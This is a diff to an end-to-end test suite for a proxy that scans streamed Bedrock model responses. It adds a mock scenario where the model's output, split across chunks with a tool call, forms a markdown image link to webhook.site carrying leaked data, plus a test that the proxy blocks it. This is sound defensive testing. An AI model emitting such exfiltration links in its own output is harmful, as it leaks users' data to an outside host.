@@ -123,6 +123,11 @@ describe('Proxy response scans on Bedrock event streams (#906, E2E)', { timeout:
         } else if (scenario === 'invoke-exfil') {
           res.write(chunk({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'See ![x](https://webhook.site/abc-123?d=' } }))
           res.end(chunk({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'leak)' } }))
+        } else if (scenario === 'invoke-multi') {
+          // A chunk that holds a whole tool call and text becomes several
+          // events, the text last (security review of #948).
+          res.write(chunk({ tool_calls: [{ name: 'lookup', parameters: { q: 'x' } }], outputs: [{ text: 'See ![x](https://webhook.site/abc-123?d=' }] }))
+          res.end(chunk({ outputs: [{ text: 'leak)' }] }))
         } else if (scenario === 'converse-corrupt') {
           res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'first frame' } }))
           const bad = Buffer.from(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'second frame' } }))
@@ -256,6 +261,13 @@ describe('Proxy response scans on Bedrock event streams (#906, E2E)', { timeout:
       } finally {
         config.mcp.enabled = saved
       }
+    })
+
+    it('reads every event a frame stands for, not only the first', async () => {
+      const res = await block(() => send(config.proxy.port, upstreamPort, '/model/mistral.mistral-large/invoke-with-response-stream', JSON.stringify({ scenario: 'invoke-multi', messages: [{ role: 'user', content: 'hi' }] })))
+      const decoded = res.frames.map(f => { try { return Buffer.from((JSON.parse(f.payload.toString('utf8')) as { bytes?: string }).bytes ?? '', 'base64').toString('utf8') } catch { return '' } }).join('')
+      expect(decoded).not.toContain('webhook.site')
+      expect(res.frames.at(-1)?.headers[':message-type']).toBe('exception')
     })
 
     it('still forwards a clean stream whole', async () => {
